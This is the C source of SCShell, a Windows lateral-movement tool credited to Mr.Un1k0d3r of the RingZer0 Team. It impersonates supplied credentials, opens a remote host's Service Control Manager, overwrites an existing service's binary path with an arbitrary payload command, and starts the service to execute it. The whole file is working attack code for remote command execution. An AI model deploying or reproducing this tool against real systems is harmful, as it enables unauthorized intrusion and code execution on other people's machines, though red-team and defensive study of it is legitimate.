// Author: Mr.Un1k0d3r RingZer0 Team

#include <Windows.h>
#include <stdio.h>

#define LOGON32_LOGON_NEW_CREDENTIALS 9

int main(int argc, char **argv) {
    CHAR* targetHost = argv[1];
    CHAR* serviceName = argv[2];
    CHAR* payload = argv[3];
    CHAR* username = argv[4];
    CHAR* domain = argv[5];
    CHAR* password = argv[6];
    BOOL bResult = FALSE;

    printf("SCShell ***\n");
    if(argc < 2) {
        ExitProcess(0);
    }

    if(strcmp(targetHost,"local") == 0) {
        targetHost = NULL;
    } else {
        printf("Trying to connect to %s\n", targetHost);
    }

    if(username != NULL) {
        HANDLE hToken = NULL;
        printf("Username was provided attempting to call LogonUserA\n");
        bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
        if(!bResult) {
            printf("LogonUserA failed %ld\n", GetLastError());
            ExitProcess(0);
        }
        bResult = FALSE;
        bResult = ImpersonateLoggedOnUser(hToken);
        if(!bResult) {
            printf("ImpersonateLoggedOnUser failed %ld\n", GetLastError());
            ExitProcess(0);
        }
    }

    SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if(schManager == NULL) {
        printf("OpenSCManagerA failed %ld\n", GetLastError());
        ExitProcess(0);
    }
    printf("SC_HANDLE Manager 0x%p\n", schManager);

    printf("Opening %s\n", serviceName);
    SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
    if(schService == NULL) {
        printf("OpenServiceA failed %ld\n", GetLastError());
        ExitProcess(0);
    }
    printf("SC_HANDLE Service 0x%p\n", schService);

    bResult = FALSE;
    bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
    if(!bResult) {
        printf("ChangeServiceConfigA failed to update the service path. %ld\n", GetLastError());
        ExitProcess(0);
    }
    printf("Service path was changed to %s\n", payload);

    bResult = FALSE;
    bResult = StartServiceA(schService, NULL, NULL);
    DWORD dwResult = GetLastError();
    if(!bResult && dwResult != 1053) {
        printf("StartServiceA failed to start the service. %ld\n", GetLastError());
        ExitProcess(0);
    }

    printf("Service was started\n");
    return 0;
}
